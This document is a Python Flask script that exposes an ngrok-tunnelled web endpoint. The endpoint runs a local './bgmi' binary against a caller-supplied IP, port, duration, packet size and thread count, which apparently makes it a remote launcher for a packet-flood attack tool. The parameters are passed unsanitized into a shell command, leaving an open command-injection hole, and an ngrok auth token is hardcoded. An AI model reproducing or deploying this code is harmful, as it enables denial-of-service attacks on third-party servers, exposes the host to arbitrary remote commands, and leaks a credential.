import os
import subprocess
import threading
from flask import Flask, request, jsonify, send_from_directory, g
from pyngrok import ngrok
import time

active_processes = {}

def install_packages():
    required_packages = ['Flask', 'pyngrok']
    for package in required_packages:
        try:
            subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'show', package])
        except subprocess.CalledProcessError:
            try:
                subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'install', package])
                print(f"{package} installed successfully.")
            except subprocess.CalledProcessError:
                print(f"Failed to install {package}.")

def configure_ngrok():
    ngrok_token =  "2ti76z0JoZWKJowf2wLmjJJVvwX_dJ1VQ4MEHtqCF8GqNoF7"
    try:
        ngrok.set_auth_token(ngrok_token)
        print("ngrok token configured successfully.")
    except Exception as e:
        print(f"Failed to configure ngrok: {str(e)}")

def update_soul_txt(public_url):
    with open("binder1.txt", "w") as file:
        file.write(public_url)
    print(f"New ngrok link saved in binder1.txt")

def execute_command_async(command, duration):
    def run(command_id):
        try:
            process = subprocess.Popen(command, shell=True)
            active_processes[command_id] = process.pid
            print(f"Command executed: {command} with PID: {process.pid}")

            time.sleep(duration)

            if process.pid in active_processes.values():
                process.terminate()
                process.wait()
                del active_processes[command_id]
                print(f"Process {process.pid} terminated after {duration} seconds.")
            g.result = {"status": "Command executed", "pid": process.pid}
        except Exception as e:
            print(f"Error executing command: {str(e)}")
            g.result = {"status": "Error executing command", "error": str(e)}

    command_id = f"cmd_{len(active_processes) + 1}"
    thread = threading.Thread(target=run, args=(command_id,))
    thread.start()
    return {"status": "Command execution started", "duration": duration}

def run_flask_app():
    app = Flask(__name__)

    @app.route('/favicon.ico')
    def favicon():
        return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')

    try:
        public_url_obj = ngrok.connect(5002)
        public_url = public_url_obj.public_url
        print(f"Public URL: {public_url}")

        update_soul_txt(public_url)
    except KeyboardInterrupt:
        print("ngrok process was interrupted.")
    except Exception as e:
        print(f"Failed to start ngrok: {str(e)}")

    @app.route('/bgmi', methods=['GET'])
    def bgmi():
        ip = request.args.get('ip')
        port = request.args.get('port')
        duration = request.args.get('time')
        packet_size = request.args.get('packet_size')
        thread = request.args.get('thread')

        if not ip or not port or not duration or not packet_size or not thread:
            return jsonify({'error': 'Missing parameters'}), 400

        command = f"./bgmi {ip} {port} {duration} {packet_size} {thread}"

        # Start the command execution asynchronously
        response = execute_command_async(command, int(duration))
        return jsonify(response)

    print("Starting Flask server...")
    app.run(host='0.0.0.0', port=5002)

if __name__ == "__main__":
    install_packages()
    configure_ngrok()
    run_flask_app()
